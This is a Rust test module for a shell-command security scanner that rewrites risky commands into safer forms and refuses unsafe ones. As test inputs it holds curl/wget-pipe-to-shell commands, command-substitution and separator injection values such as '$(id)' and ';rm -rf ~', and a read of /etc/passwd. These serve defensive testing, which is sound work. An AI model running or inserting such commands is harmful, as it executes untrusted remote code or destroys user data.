        assert_eq!(sc, "curl https://example.com/install.sh");
    }

    #[test]
    fn insecure_tls_long_flag_dropped() {
        let cmd = "wget --no-check-certificate https://example.com/x";
        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert_eq!(sc, "wget https://example.com/x");
    }

    #[test]
    fn insecure_tls_drop_preserves_quoted_arg_with_spaces() {
        // Span-based deletion must not mangle a quoted arg with whitespace.
        let cmd = r#"curl -k --data "a b c" https://example.com/x"#;
        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert_eq!(sc, r#"curl --data "a b c" https://example.com/x"#);
    }

    #[test]
    fn insecure_tls_drop_handles_flag_in_middle() {
        let cmd = "curl https://example.com/x -k -o out";
        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert_eq!(sc, "curl https://example.com/x -o out");
    }

    #[test]
    fn insecure_tls_k_inside_quoted_string_not_rewritten() {
        // `-k` only appears inside a quoted payload — the tokenizer cross-check
        // must prevent a rewrite.
        let cmd = r#"curl --data "pass -k here" https://example.com/x"#;
        let segs = tokenize::tokenize(cmd, ShellType::Posix);
        assert!(rewrite_drop_insecure_tls(cmd, &segs).is_none());
    }

    #[test]
    fn plain_http_rewritten_to_https() {
        let cmd = "curl -fsSL http://example.com/install.sh | bash";
        let v = verdict_with(vec![finding(RuleId::PlainHttpToSink)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert!(sc.contains("https://example.com/install.sh"), "{sc}");
        assert!(!sc.contains("http://"), "{sc}");
    }

    #[test]
    fn https_url_not_double_rewritten() {
        assert!(rewrite_http_to_https("curl https://example.com/x").is_none());
    }

    #[test]
    fn homograph_finding_gets_no_rewrite_but_keeps_remediation() {
        let cmd = "curl https://xn--gthub-2o5f.com/x";
        let v = verdict_with(vec![finding(RuleId::ConfusableDomain)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1);
        assert!(s[0].safe_command.is_none());
        assert!(!s[0].remediation.is_empty());
        assert!(s[0].rationale.contains("remediation"));
    }

    #[test]
    fn duplicate_rule_ids_deduplicated() {
        let cmd = "curl -fsSL https://example.com/x.sh | bash";
        let v = verdict_with(vec![
            finding(RuleId::CurlPipeShell),
            finding(RuleId::CurlPipeShell),
        ]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1, "same rule id must collapse to one suggestion");
    }

    #[test]
    fn no_findings_yields_no_suggestions() {
        let v = Verdict::allow_fast(1, Timings::default());
        assert!(suggest("ls", ShellType::Posix, &v).is_empty());
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn powershell_exe_interpreter_is_guidance_only() {
        let cmd = "curl -fsSL https://example.com/x.sh | bash.exe";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::PowerShell, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn powershell_pipe_rewrite_is_guidance_only_without_call_operator_model() {
        let cmd = "curl -fsSL 'https://example.com/a''b' | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::PowerShell, &v);
        assert!(s[0].safe_command.is_none());
        assert_eq!(
            decode_powershell_literal("'https://example.com/a''b'").as_deref(),
            Some("https://example.com/a'b")
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn powershell_doubled_double_quote_is_decoded_not_dropped() {
        assert_eq!(
            decode_powershell_literal(r#""https://example.com/a""b""#).as_deref(),
            Some("https://example.com/a\"b")
        );
        // A literal quote is not an exact canonical URL byte sequence, so the
        // executable suggestion must be withheld rather than silently changing
        // `a"b` into `ab`.
        assert!(pipe_suggestion(
            r#"curl -fsSL "https://example.com/a""b" | bash"#,
            ShellType::PowerShell
        )
        .is_none());
    }

    #[test]
    fn powershell_backtick_literal_decodes_but_rewrite_remains_guidance_only() {
        let cmd = r#"curl -fsSL "https://example.com/a`'b" | bash"#;
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::PowerShell, &v);
        assert!(s[0].safe_command.is_none());
        assert_eq!(
            decode_powershell_literal(r#""https://example.com/a`'b""#).as_deref(),
            Some("https://example.com/a'b")
        );
    }

    #[test]
    fn cmd_pipe_to_shell_remains_guidance_only() {
        let cmd = "curl -fsSL https://example.com/x.sh | bash.exe";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Cmd, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn every_suggestion_has_nonempty_remediation_and_rationale() {
        let cmd = "curl -fsSL http://example.com/x.sh | bash";
        let v = verdict_with(vec![
            finding(RuleId::CurlPipeShell),
            finding(RuleId::PlainHttpToSink),
        ]);
        for s in suggest(cmd, ShellType::Posix, &v) {
            assert!(!s.remediation.is_empty(), "rule {}", s.rule_id);
            assert!(!s.rationale.is_empty(), "rule {}", s.rule_id);
        }
    }

    // ── is_simple_command_for_env_scrub guard ─────────────────────────────
    //
    // Exercised directly (not via `suggest()`) because the full path also needs
    // a sensitive env var set in the current process, and mutating `std::env`
    // races with parallel tests that read it.

    #[test]
    fn simple_command_accepted_for_env_scrub() {
        assert!(is_simple_command_for_env_scrub("npm install foo"));
        assert!(is_simple_command_for_env_scrub(
            "curl https://example.com/x"
        ));
        assert!(is_simple_command_for_env_scrub("pip install requests"));
        assert!(is_simple_command_for_env_scrub("ls -la /tmp"));
    }

    #[test]
    fn pipeline_rejected_for_env_scrub() {
        // The piped second stage still inherits the original env — refuse.
        assert!(!is_simple_command_for_env_scrub("npm install foo | sh"));
        assert!(!is_simple_command_for_env_scrub(
            "curl -fsSL https://foo | bash"
        ));
    }

    #[test]
    fn logical_chain_rejected_for_env_scrub() {
        // `&&` / `||` / `;` run a second command that keeps the original env.
        assert!(!is_simple_command_for_env_scrub("ls && cat secret"));
        assert!(!is_simple_command_for_env_scrub("ls || echo failed"));
        assert!(!is_simple_command_for_env_scrub("ls; cat secret"));
    }

    #[test]
    fn redirection_rejected_for_env_scrub() {
        // Conservative: a redirect may be part of a compound we can't reason
        // about.
        assert!(!is_simple_command_for_env_scrub("ls > /tmp/x"));
        assert!(!is_simple_command_for_env_scrub("cat < /etc/passwd"));
        assert!(!is_simple_command_for_env_scrub("ls >> /tmp/x"));
    }

    #[test]
    fn background_and_subshell_rejected_for_env_scrub() {
        assert!(!is_simple_command_for_env_scrub("long-job &"));
        assert!(!is_simple_command_for_env_scrub("(cd /tmp && ls)"));
    }

    #[test]
    fn command_substitution_rejected_for_env_scrub() {
        // `$(...)` / backticks spawn a child shell that inherits the env, even
        // inside double quotes.
        assert!(!is_simple_command_for_env_scrub("echo $(whoami)"));
        assert!(!is_simple_command_for_env_scrub("echo `whoami`"));
        assert!(!is_simple_command_for_env_scrub("echo \"$(whoami)\""));
        assert!(!is_simple_command_for_env_scrub("echo \"`whoami`\""));
    }

    #[test]
    fn metacharacter_inside_single_quotes_does_not_disqualify() {
        // Single-quoted contents are literal in POSIX — still a single command.
        assert!(is_simple_command_for_env_scrub(
            "echo 'this is | not a pipe'"
        ));
        assert!(is_simple_command_for_env_scrub("echo 'a && b'"));
        assert!(is_simple_command_for_env_scrub("echo 'cat > file'"));
    }

    #[test]
    fn metacharacter_inside_double_quotes_treated_correctly() {
        // In double quotes, `|`/`&`/`;`/`<`/`>`/`(`/`)` are literal — still a
        // single command — but `$(` and backtick are still active.
        assert!(is_simple_command_for_env_scrub(
            "echo \"this is | not a pipe\""
        ));
        assert!(is_simple_command_for_env_scrub("echo \"a && b\""));
        assert!(!is_simple_command_for_env_scrub("echo \"$(whoami)\""));
    }

    #[test]
    fn escaped_metacharacter_does_not_disqualify() {
        // A backslash-escaped metacharacter is a literal, not a pipeline.
        assert!(is_simple_command_for_env_scrub("grep \\| file"));
        assert!(is_simple_command_for_env_scrub("echo a\\&b"));
    }

    #[test]
    fn unterminated_quote_is_rejected() {
        // Malformed input — decline (guessing the wrapper is most dangerous here).
        assert!(!is_simple_command_for_env_scrub("echo 'unterminated"));
        assert!(!is_simple_command_for_env_scrub("echo \"unterminated"));
        assert!(!is_simple_command_for_env_scrub("echo trailing\\"));
    }

    #[test]
    fn dedicated_rule_present_is_an_env_scrub_trigger() {
        // M9 ch4 — the dedicated `EnvSensitiveExposedToUnknownScript` finding
        // (Medium, so the `any_high` heuristic is false) is recognized as an
        // env-scrub trigger. Exercises the predicate WITHOUT mutating `std::env`
        // (the setenv race, PR #125); the end-to-end rewrite is covered race-free
        // by the CLI integration test `env_scrub_fires_under_dedicated_rule`.
        let mut f = finding(RuleId::EnvSensitiveExposedToUnknownScript);
        f.severity = Severity::Medium;
        let v = verdict_with(vec![f]);
        let any_high = v.findings.iter().any(|f| f.severity >= Severity::High);
        let dedicated_present = v
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::EnvSensitiveExposedToUnknownScript);
        assert!(!any_high, "Medium finding must not trip the High heuristic");
        assert!(
            dedicated_present,
            "dedicated rule must be detectable as an env-scrub trigger"
        );
    }

    // NOTE: no end-to-end compound-shape test mutates `std::env::GITHUB_TOKEN`
    // (it would race parallel tests that read the env). The compound-shape guard
    // is fully covered by the `is_simple_command_for_env_scrub` unit tests above.

    // ── shell_single_quote — untrusted-token neutralization (PR124) ────────

    #[test]
    fn shell_single_quote_wraps_plain_token() {
        assert_eq!(
            shell_single_quote("requests").as_deref(),
            Some("'requests'")
        );
        assert_eq!(
            shell_single_quote("https://example.com/install.sh").as_deref(),
            Some("'https://example.com/install.sh'")
        );
    }

    #[test]
    fn shell_single_quote_neutralizes_command_substitution() {
        // `$( )` and backticks become inert literals inside single quotes.
        assert_eq!(
            shell_single_quote("http://x/$(id)").as_deref(),
            Some("'http://x/$(id)'")
        );
        assert_eq!(
            shell_single_quote("http://x/`id`").as_deref(),
            Some("'http://x/`id`'")
        );
    }

    #[test]
    fn shell_single_quote_neutralizes_separators_and_spaces() {
        assert_eq!(
            shell_single_quote("http://x/a;rm -rf ~").as_deref(),
            Some("'http://x/a;rm -rf ~'")
        );
        assert_eq!(
            shell_single_quote("a|b&c>d<e").as_deref(),
            Some("'a|b&c>d<e'")
        );
    }

    #[test]
    fn shell_single_quote_escapes_embedded_single_quote() {
        // foo'bar → 'foo'\''bar' (close, escaped literal quote, reopen).
        assert_eq!(
            shell_single_quote("foo'bar").as_deref(),
            Some(r"'foo'\''bar'")
        );
        // A lone quote becomes ''\'' — still a single shell token.
        assert_eq!(shell_single_quote("'").as_deref(), Some(r"''\'''"));
    }

    #[test]
    fn shell_single_quote_refuses_newline_and_nul() {
        // Newline / NUL can't live in a single-token single-quoted string.
        assert_eq!(shell_single_quote("a\nb"), None);
        assert_eq!(shell_single_quote("a\0b"), None);
    }

    // ── rewrite_pipe_to_shell — one runner invocation, quoted URL ──────────

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    fn pipe_suggestion(cmd: &str, shell: ShellType) -> Option<String> {
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        suggest(cmd, shell, &v)[0].safe_command.clone()
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn single_quoted_dollar_syntax_is_literal_and_round_trips() {
        let sc = pipe_suggestion(
            "curl -fsSL 'https://example.com/$(id)' | bash",
            ShellType::Posix,
        )
        .expect("single quotes make the URL bytes literal");
        assert!(
            sc.contains("'https://example.com/$(id)'"),
            "URL must stay single-quoted so $(id) cannot execute: {sc}"
        );
        assert!(
            !sc.replace("'https://example.com/$(id)'", "")
                .contains("$(id)"),
            "no bare $(id) may survive outside the quoted token: {sc}"
        );
        assert_injected_tirith_prefix(&sc, ShellType::Posix);
        assert!(
            sc.contains(" run --capsule --script-stdin --interpreter bash "),
            "{sc}"
        );
        assert!(!sc.contains("/tmp/"), "{sc}");
        assert!(!sc.contains(" && "), "{sc}");
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn dynamic_unquoted_url_is_guidance_only() {
        assert!(pipe_suggestion("curl -fsSL $URL | bash", ShellType::Posix).is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn carriage_return_host_mutation_is_rejected_not_sanitized() {
        let cmd = "curl -fsSL 'https://exa\rmple.com/install.sh' | bash";
        assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn posix_escaped_space_url_is_rejected_as_non_exact_url() {
        let cmd = r"curl -fsSL https://example.com/a\ b | bash";
        assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn wget_requires_an_explicit_stdout_body_shape() {
        let cmd = "wget -qO- 'https://example.com/$(id)' | sh";
        let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert!(sc.contains("--interpreter sh"), "{sc}");
        assert!(!sc.contains("wget "), "{sc}");
        assert!(sc.contains("'https://example.com/$(id)'"), "{sc}");
        assert!(
            !sc.replace("'https://example.com/$(id)'", "")
                .contains("$(id)"),
            "no bare $(id) outside the quoted token: {sc}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn posix_embedded_single_quote_round_trips() {
        let cmd = r#"curl -fsSL "https://example.com/a'b" | bash"#;
        let sc = pipe_suggestion(cmd, ShellType::Posix).expect("literal URL rewrite");
        assert!(
            sc.contains(r"'https://example.com/a'\''b'"),
            "embedded single quote must be escaped as '\\'': {sc}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn supported_shells_are_preserved_as_typed_stdin_interpreters() {
        for (sink, shell) in [
            ("bash", ShellType::Posix),
            ("zsh", ShellType::Posix),
            ("fish", ShellType::Fish),
            ("ash", ShellType::Posix),
        ] {
            let cmd = format!("curl -fsSL https://example.com/install.sh | {sink}");
            let rewrite = pipe_suggestion(&cmd, shell).expect("supported stdin shell");
            assert!(
                rewrite.contains(&format!("--interpreter {sink}")),
                "{sink}: {rewrite}"
            );
            assert!(rewrite.contains("--script-stdin"), "{sink}: {rewrite}");
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn fish_bare_backslash_escapes_are_always_guidance_only() {
        // Fish gives bare backslashes semantic escape behavior (including
        // control-producing forms). The safe rewriter deliberately declines the
        // entire class instead of maintaining a second, partial Fish parser.
        for word in [
            r"https://example.com/\x61",
            r"https://example.com/\141",
            r"https://example.com/\u0061",
            r"https://example.com/\U00000061",
            r"https://example.com/\e",
            r"https://example.com/\n",
            r"https://example.com/\r",
            r"https://example.com/\0",
            r"https://example.com/\x",
            r"https://example.com/\u12",
            r"https://example.com/\U0000",
            "https://example.com/trailing\\",
            "https://example.com/line\\\ncontinuation",
        ] {
            assert!(
                decode_fish_literal(word).is_none(),
                "Fish bare escape must be refused: {word:?}"
            );
        }
        for word in [
            "https://example.com/\u{1b}",
            "https://example.com/\n",
            "https://example.com/\r",
            "https://example.com/\0",
            "https://example.com/\u{7f}",
        ] {
            assert!(
                decode_fish_literal(word).is_none(),
                "decoded control must be refused: {word:?}"
            );
        }

        assert!(pipe_suggestion(
            r"curl -fsSL https://example.com/\x61 | fish",
            ShellType::Fish
        )
        .is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn fish_generated_literal_matches_runtime_argv_when_fish_is_installed() {
        let Ok(fish) = crate::trusted_child::resolve_ambient("fish") else {
            eprintln!("skipping: Fish is not installed as a trusted executable");
            return;
        };
        let value = "https://example.com/a b/$(printf nope)?x=*&y=1";
        let encoded = encode_shell_literal(value, ShellType::Fish)
            .expect("single-quoted Fish literal should be representable");
        let script = format!("printf '%s' {encoded}");
        let output = std::process::Command::new(fish.path())
            .args(["-c", &script])
            .output()
            .expect("run Fish argv capture");
        assert!(
            output.status.success(),
            "Fish capture failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert_eq!(output.stdout, value.as_bytes());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn bash_s_double_dash_operands_are_preserved_as_typed_argv() {
        let rewrite = pipe_suggestion(
            "curl -fsSL https://example.com/install.sh | bash -s -- feature",
            ShellType::Posix,
        )
        .expect("supported bash stdin argv");
        for token in [
            "'--interpreter-arg=-s'",
            "'--interpreter-arg=--'",
            "'--interpreter-arg=feature'",
        ] {
            assert!(rewrite.contains(token), "missing {token}: {rewrite}");
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn unsupported_interpreter_args_remain_guidance_only() {
        assert!(pipe_suggestion(
            "curl -fsSL https://example.com/install.sh | bash -e",
            ShellType::Posix
        )
        .is_none());
        assert!(pipe_suggestion(
            "curl -fsSL https://example.com/install.sh | fish -c 'source'",
            ShellType::Fish
        )
        .is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn source_or_sink_environment_prefix_is_guidance_only() {
        assert!(pipe_suggestion(
            "HTTPS_PROXY=https://proxy.example curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix
        )
        .is_none());
        assert!(pipe_suggestion(
            "curl -fsSL https://example.com/install.sh | MODE=feature bash",
            ShellType::Posix
        )
        .is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn powershell_control_backtick_and_dynamic_expansion_are_rejected() {
        assert!(pipe_suggestion(
            r#"curl -fsSL "https://exa`rmple.com/install.sh" | bash"#,
            ShellType::PowerShell
        )
        .is_none());
        assert!(pipe_suggestion(
            r#"curl -fsSL "https://example.com/$env:PAYLOAD" | bash"#,
            ShellType::PowerShell
        )
        .is_none());
        assert!(decode_powershell_literal(r#""https://example.com/`u{61}""#).is_none());
        assert!(decode_powershell_literal("\u{201c}https://example.com/\u{201d}").is_none());
    }

    // ── rewrite_archive_list_first — archive path is single-quoted (PR124) ──

    #[test]
    fn archive_list_first_quotes_command_substitution_path() {
        // A hostile archive path with `$(id)`. Only the preview half is quoted;
        // the `&&` tail re-emits the user's raw command verbatim.
        let cmd = "tar -xzf '$(id).tar.gz'";
        let v = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert!(
            sc.starts_with("tar -tf '$(id).tar.gz' | head"),
            "archive path on the preview half must be single-quoted: {sc}"
        );
        // The preview half (before ` && `) must not contain a bare $(id).
        let preview = sc.split(" && ").next().unwrap();
        assert!(
            !preview.replace("'$(id).tar.gz'", "").contains("$(id)"),
            "no bare $(id) on the preview half: {sc}"
        );
    }

    #[test]
    fn archive_list_first_does_not_requote_raw_tail() {
        // The `&&` tail is the user's ORIGINAL command, re-emitted verbatim —
        // it must NOT be wrapped in quotes (that would corrupt it).
        let cmd = "tar -xzf foo.tar.gz -C ~/";
        let v = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert!(
            sc.ends_with(" && tar -xzf foo.tar.gz -C ~/"),
            "raw tail must be re-emitted verbatim, unquoted: {sc}"
        );
    }

    // ── dotfile_redirect_token_is_safe — refuse-not-quote (PR124) ──────────

    #[test]
    fn dotfile_token_accepts_plain_paths() {
        // Legitimate `~`/`$HOME` dotfile paths stay accepted (so the rewrite can
        // keep them UNQUOTED for shell expansion).
        assert!(dotfile_redirect_token_is_safe("~/.bashrc"));
        assert!(dotfile_redirect_token_is_safe(
            "$HOME/.config/foo/config.toml"
        ));
        assert!(dotfile_redirect_token_is_safe("~/.ssh/authorized_keys"));
    }

    #[test]
    fn dotfile_token_refuses_injection_payloads() {
        // Metacharacters after the prefix are an injection/glob attempt — refuse.
        assert!(!dotfile_redirect_token_is_safe("~/.bashrc$(id)"));
        assert!(!dotfile_redirect_token_is_safe("~/.b`id`"));
        assert!(!dotfile_redirect_token_is_safe("$HOME/.x;rm -rf ~"));
        assert!(!dotfile_redirect_token_is_safe("~/.x|sh"));
        assert!(!dotfile_redirect_token_is_safe("~/.x*"));
        assert!(!dotfile_redirect_token_is_safe("~/.x y"));
        // A second `$` (beyond the legitimate `$HOME` prefix) is refused.
        assert!(!dotfile_redirect_token_is_safe("$HOME/.x$EVIL"));
        // Wrong / missing prefix → refuse (defensive; extractor only emits these two).
        assert!(!dotfile_redirect_token_is_safe("/etc/passwd"));
        assert!(!dotfile_redirect_token_is_safe("~/"));
    }
}
